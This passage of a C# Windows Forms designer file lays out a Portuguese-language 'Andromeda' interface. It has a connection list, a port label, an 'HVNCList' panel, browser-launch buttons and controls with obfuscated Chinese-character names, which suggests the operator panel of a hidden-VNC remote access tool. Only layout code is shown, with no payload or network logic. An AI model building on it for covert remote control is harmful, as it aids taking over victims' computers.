            this.Guna2GradientButton2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton2.Location = new System.Drawing.Point(6, 505);
            this.Guna2GradientButton2.Name = "Guna2GradientButton2";
            this.Guna2GradientButton2.Size = new System.Drawing.Size(215, 45);
            this.Guna2GradientButton2.TabIndex = 99;
            this.Guna2GradientButton2.Text = "Comunidade";
            this.Guna2GradientButton2.Click += new System.EventHandler(this.Guna2GradientButton2_Click);
            // 
            // Guna2GradientButton1
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientButton1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton1.FillColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.Transparent;
            this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(82)))), ((int)(((byte)(43)))), ((int)(((byte)(235)))));
            this.Guna2GradientButton1.Image = ((System.Drawing.Image)(resources.GetObject("Guna2GradientButton1.Image")));
            this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton1.Location = new System.Drawing.Point(6, 444);
            this.Guna2GradientButton1.Name = "Guna2GradientButton1";
            this.Guna2GradientButton1.Size = new System.Drawing.Size(215, 45);
            this.Guna2GradientButton1.TabIndex = 98;
            this.Guna2GradientButton1.Text = "Tutorial Andromeda";
            this.Guna2GradientButton1.Click += new System.EventHandler(this.Guna2GradientButton1_Click);
            // 
            // Guna2GradientButton3
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2GradientButton3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientButton3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton3.FillColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton3.FillColor2 = System.Drawing.Color.Transparent;
            this.Guna2GradientButton3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(82)))), ((int)(((byte)(43)))), ((int)(((byte)(235)))));
            this.Guna2GradientButton3.Image = ((System.Drawing.Image)(resources.GetObject("Guna2GradientButton3.Image")));
            this.Guna2GradientButton3.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton3.Location = new System.Drawing.Point(6, 384);
            this.Guna2GradientButton3.Name = "Guna2GradientButton3";
            this.Guna2GradientButton3.Size = new System.Drawing.Size(215, 45);
            this.Guna2GradientButton3.TabIndex = 95;
            this.Guna2GradientButton3.Text = "Documentação";
            this.Guna2GradientButton3.Click += new System.EventHandler(this.Guna2GradientButton3_Click);
            // 
            // Guna2GradientButton7
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2GradientButton7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientButton7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientButton7.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton7.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton7.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton7.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton7.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton7.FillColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton7.FillColor2 = System.Drawing.Color.Transparent;
            this.Guna2GradientButton7.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(82)))), ((int)(((byte)(43)))), ((int)(((byte)(235)))));
            this.Guna2GradientButton7.Image = ((System.Drawing.Image)(resources.GetObject("Guna2GradientButton7.Image")));
            this.Guna2GradientButton7.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton7.Location = new System.Drawing.Point(3, 204);
            this.Guna2GradientButton7.Name = "Guna2GradientButton7";
            this.Guna2GradientButton7.PressedColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton7.Size = new System.Drawing.Size(218, 45);
            this.Guna2GradientButton7.TabIndex = 18;
            this.Guna2GradientButton7.Text = "Pagina Inicial";
            this.Guna2GradientButton7.Click += new System.EventHandler(this.Guna2GradientButton7_Click);
            // 
            // Guna2GradientButton6
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2GradientButton6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientButton6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientButton6.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton6.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton6.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton6.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton6.FillColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton6.FillColor2 = System.Drawing.Color.Transparent;
            this.Guna2GradientButton6.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(82)))), ((int)(((byte)(43)))), ((int)(((byte)(235)))));
            this.Guna2GradientButton6.Image = ((System.Drawing.Image)(resources.GetObject("Guna2GradientButton6.Image")));
            this.Guna2GradientButton6.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton6.Location = new System.Drawing.Point(3, 327);
            this.Guna2GradientButton6.Name = "Guna2GradientButton6";
            this.Guna2GradientButton6.PressedColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton6.Size = new System.Drawing.Size(218, 45);
            this.Guna2GradientButton6.TabIndex = 17;
            this.Guna2GradientButton6.Text = "Configuração Inicial";
            this.Guna2GradientButton6.Click += new System.EventHandler(this.Guna2GradientButton6_Click);
            // 
            // Guna2PictureBox1
            // 
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox1.Image")));
            this.Guna2PictureBox1.ImageRotate = 0F;
            this.Guna2PictureBox1.Location = new System.Drawing.Point(-13, -50);
            this.Guna2PictureBox1.Name = "Guna2PictureBox1";
            this.Guna2PictureBox1.Size = new System.Drawing.Size(250, 250);
            this.Guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Guna2PictureBox1.TabIndex = 14;
            this.Guna2PictureBox1.TabStop = false;
            this.Guna2PictureBox1.UseTransparentBackground = true;
            // 
            // Guna2GradientButton4
            // 
            this.Guna2Transition1.SetDecoration(this.Guna2GradientButton4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientButton4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton4.FillColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton4.FillColor2 = System.Drawing.Color.Transparent;
            this.Guna2GradientButton4.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(82)))), ((int)(((byte)(43)))), ((int)(((byte)(235)))));
            this.Guna2GradientButton4.Image = ((System.Drawing.Image)(resources.GetObject("Guna2GradientButton4.Image")));
            this.Guna2GradientButton4.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton4.Location = new System.Drawing.Point(3, 263);
            this.Guna2GradientButton4.Name = "Guna2GradientButton4";
            this.Guna2GradientButton4.PressedColor = System.Drawing.Color.Transparent;
            this.Guna2GradientButton4.Size = new System.Drawing.Size(218, 45);
            this.Guna2GradientButton4.TabIndex = 13;
            this.Guna2GradientButton4.Text = "Lista de conexão";
            this.Guna2GradientButton4.Click += new System.EventHandler(this.Guna2GradientButton4_Click);
            // 
            // PortText
            // 
            this.PortText.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.PortText.AutoSize = true;
            this.PortText.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.PortText, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.PortText, Guna.UI2.AnimatorNS.DecorationType.None);
            this.PortText.Font = new System.Drawing.Font("Palatino Linotype", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.PortText.ForeColor = System.Drawing.Color.White;
            this.PortText.Location = new System.Drawing.Point(37, 808);
            this.PortText.Name = "PortText";
            this.PortText.Size = new System.Drawing.Size(43, 19);
            this.PortText.TabIndex = 8;
            this.PortText.Text = "Porta";
            // 
            // Painel_connection
            // 
            this.Painel_connection.Controls.Add(this.HVNCList);
            this.Guna2Transition1.SetDecoration(this.Painel_connection, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Painel_connection, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Painel_connection.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Painel_connection.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_connection.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_connection.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Painel_connection.Location = new System.Drawing.Point(224, 73);
            this.Painel_connection.Name = "Painel_connection";
            this.Painel_connection.Size = new System.Drawing.Size(1084, 738);
            this.Painel_connection.TabIndex = 156;
            this.Painel_connection.Visible = false;
            // 
            // Painel_Home
            // 
            this.Painel_Home.Controls.Add(this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三);
            this.Painel_Home.Controls.Add(this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道);
            this.Painel_Home.Controls.Add(this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中);
            this.Painel_Home.Controls.Add(this.Panel_ControlPage);
            this.Painel_Home.Controls.Add(this.guna2PictureBox18);
            this.Painel_Home.Controls.Add(this.Guna_Chrome);
            this.Painel_Home.Controls.Add(this.Guna_Edge);
            this.Painel_Home.Controls.Add(this.Guna_Firefox);
            this.Painel_Home.Controls.Add(this.Guna_Brave);
            this.Painel_Home.Controls.Add(this.Guna_Opera);
            this.Painel_Home.Controls.Add(this.Painel_Right);
            this.Painel_Home.Controls.Add(this.Moldura);
            this.Guna2Transition1.SetDecoration(this.Painel_Home, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Painel_Home, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Painel_Home.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Painel_Home.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_Home.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_Home.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Painel_Home.Location = new System.Drawing.Point(224, 73);
            this.Painel_Home.Name = "Painel_Home";
            this.Painel_Home.Size = new System.Drawing.Size(1084, 738);
            this.Painel_Home.TabIndex = 9;
            // 
            // 要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三
            // 
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.BackColor = System.Drawing.Color.Transparent;
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.BorderColor = System.Drawing.Color.Transparent;
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.BorderRadius = 6;
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.BorderThickness = 1;
            this.Guna2Transition1.SetDecoration(this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三, Guna.UI2.AnimatorNS.DecorationType.None);
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.Image = ((System.Drawing.Image)(resources.GetObject("要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.Image")));
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.Location = new System.Drawing.Point(6, 691);
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.Name = "要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三";
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.ShadowDecoration.Shadow = new System.Windows.Forms.Padding(2, 1, 2, 5);
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.Size = new System.Drawing.Size(188, 37);
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.TabIndex = 170;
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.Text = "Instagram";
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三.Click += new System.EventHandler(this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三_Click);
            // 
            // 谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道
            // 
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.BackColor = System.Drawing.Color.Transparent;
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.BorderColor = System.Drawing.Color.Transparent;
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.BorderRadius = 6;
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.BorderThickness = 1;
            this.Guna2Transition1.SetDecoration(this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道, Guna.UI2.AnimatorNS.DecorationType.None);
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.Image = ((System.Drawing.Image)(resources.GetObject("谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.Image")));
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.Location = new System.Drawing.Point(442, 691);
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.Name = "谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道";
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.ShadowDecoration.Shadow = new System.Windows.Forms.Padding(2, 1, 2, 5);
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.Size = new System.Drawing.Size(188, 37);
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.TabIndex = 169;
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.Text = "Youtube";
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道.Click += new System.EventHandler(this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道_Click);
            // 
            // 式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中
            // 
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.BackColor = System.Drawing.Color.Transparent;
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.BorderColor = System.Drawing.Color.Transparent;
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.BorderRadius = 6;
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.BorderThickness = 1;
            this.Guna2Transition1.SetDecoration(this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中, Guna.UI2.AnimatorNS.DecorationType.None);
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(156)))), ((int)(((byte)(176)))));
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.Image = ((System.Drawing.Image)(resources.GetObject("式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.Image")));
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.Location = new System.Drawing.Point(210, 691);
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.Name = "式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中";
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.ShadowDecoration.Color = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.ShadowDecoration.Shadow = new System.Windows.Forms.Padding(2, 1, 2, 5);
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.Size = new System.Drawing.Size(171, 37);
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.TabIndex = 168;
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.Text = "Suporte Andromeda";
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中.Click += new System.EventHandler(this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中_Click);
            // 
            // Panel_ControlPage
            // 
            this.Panel_ControlPage.BackColor = System.Drawing.Color.Transparent;
            this.Panel_ControlPage.BorderRadius = 2;
            this.Panel_ControlPage.BorderThickness = 1;
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox31);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox30);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel48);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel47);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel45);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel44);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox26);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox25);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox24);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox23);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox22);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox19);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel43);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel42);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox20);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel41);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel40);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel39);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel38);
            this.Panel_ControlPage.Controls.Add(this.guna2HtmlLabel37);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox17);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox16);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox15);
            this.Panel_ControlPage.Controls.Add(this.guna2PictureBox14);
            this.Panel_ControlPage.Controls.Add(this.Guna2HtmlLabel46);
            this.Panel_ControlPage.Controls.Add(this.Guna2PictureBox80);
            this.Guna2Transition1.SetDecoration(this.Panel_ControlPage, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Panel_ControlPage, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Panel_ControlPage.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Panel_ControlPage.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Panel_ControlPage.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Panel_ControlPage.Location = new System.Drawing.Point(0, 518);
            this.Panel_ControlPage.Name = "Panel_ControlPage";
